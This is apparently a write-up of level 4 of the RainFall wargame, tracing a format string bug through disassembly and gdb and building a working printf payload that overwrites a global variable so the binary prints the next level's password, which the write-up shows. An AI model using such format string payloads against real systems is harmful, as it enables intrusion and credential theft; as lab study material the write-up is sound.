## LEVEL 4
---

Most important parts:
```shell
main:
[...]
    0x080484ad <+6>:	call   0x8048457 <n> ; Call n function without arguments
[...]
```
```shell
n:
[...]
    0x0804845a <+3>:	sub    $0x218,%esp ; Allocate 536 bytes on the stack
[...]
    0x08048471 <+26>:	lea    -0x208(%ebp),%eax ; Load the address of the buffer in $eax
    0x08048477 <+32>:	mov    %eax,(%esp) ; Put the address of the buffer on $esp
    0x0804847a <+35>:	call   0x8048350 <fgets@plt> ; Call fgets(buffer, 512, stdin)
    0x0804847f <+40>:	lea    -0x208(%ebp),%eax ; Load the address of the buffer in $eax
    0x08048485 <+46>:	mov    %eax,(%esp) ; Put the address of the buffer on $esp
    0x08048488 <+49>:	call   0x8048444 <p> ; Call p(buffer)
    0x0804848d <+54>:	mov    0x8049810,%eax ; Load global variable in $eax
    0x08048492 <+59>:	cmp    $0x1025544,%eax ; Compare the global variable with 0x1025544
[...]
    0x080484a0 <+73>:	call   0x8048360 <system@plt> ; Call system("/bin/cat /home/user/level5/.pass")
[...]
```
```shell
p:
[...]
    0x0804844a <+6>:	mov    0x8(%ebp),%eax ; Load the first argument of p in $eax
    0x0804844d <+9>:	mov    %eax,(%esp) ; Put the first argument of p on $esp
    0x08048450 <+12>:	call   0x8048340 <printf@plt> ; Call printf(first_argument)
[...]
```

This README will be relatively short because the logic is very similar to the previous level, with two exceptions that I will explain.

The first exception I that `printf` is called in another function, so the distance between where the buffer is store and the address where `printf` gets its arguments is not the same as in the previous level, it will be higher. Let's calculate that to be sure which argument we need to change to overwrite the global variable.

```shell
(gdb) b *0x08048450
Breakpoint 1 at 0x8048450
(gdb) r
Starting program: /home/user/level4/level4
AAAA
(gdb) x/32a $esp
0xbffff4f0:	0xbffff520	0xb7ff26b0	0xbffff764	0xb7fd0ff4
0xbffff500:	0x0	0x0	0xbffff728	0x804848d <n+54>
0xbffff510:	0xbffff520	0x200	0xb7fd1ac0 <_IO_2_1_stdin_>	0xb7ff37d0 <__libc_memalign+16>
0xbffff520:	0x41414141
```

We can observe that the address of the buffer is `0xbffff520`, and the format string attack will begin printing addresses from `0xbffff4f4` (the address of the first argument of `printf` after the buffer). Therefore, `(0xbffff520 - 0xbffff4f4)/4 = 0xb == 11`. We add one because I intend to write at the address `0xbffff520`.

The second exception is the value to compare the global variable, in the previous level it was 64 which is easy to write before the variable, but here it is `0x1025544` which is too big to write. We will have to find another way to write it.

Bu curiosity this is the errors we've got if I write the caracter manually :


```shell
$ python -c 'print "\x10\x98\x04\x08" + "A"*16930112 + "%12$n"' | ./level4
AAAAAAAAA[...]AAAAAAAAATraceback (most recent call last):
  File "<string>", line 1, in <module>
IOError: [Errno 32] Broken pipe
```
Or
```shell
$ python -c 'print "\x10\x98\x04\x08" + "A"*16930112 + "%12$n"' >/tmp/payload
$ cat /tmp/payload | ./level4
AAAAAAAAAAAAAAAAAA[...]AAAAAAAAAAAAlevel4@RainFall:~$
```
In the first case, we have a pipe error and in the second the pipe is limited.

So we have to find a way to printf to write 16930116 characters, without breaking pipes. For that I will use `printf` padding flag which is `%{padding number}d`, it will write `(padding number) - len(number)`. For example, `%10d` will write 10 - 1 = 9 spaces before the number.

Now we can create the payload like this format :
`"{address_of_global_variable_reversed}" + "%{compared_value_minus_4}d" + %{position_to_reach}$n`

```shell
$ python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' > /tmp/payload
$ cat /tmp/payload | ./level4
[...]
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

---
*Source :*

*https://www.lix.polytechnique.fr/~liberti/public/computing/prog/c/C/FUNCTIONS/format.html*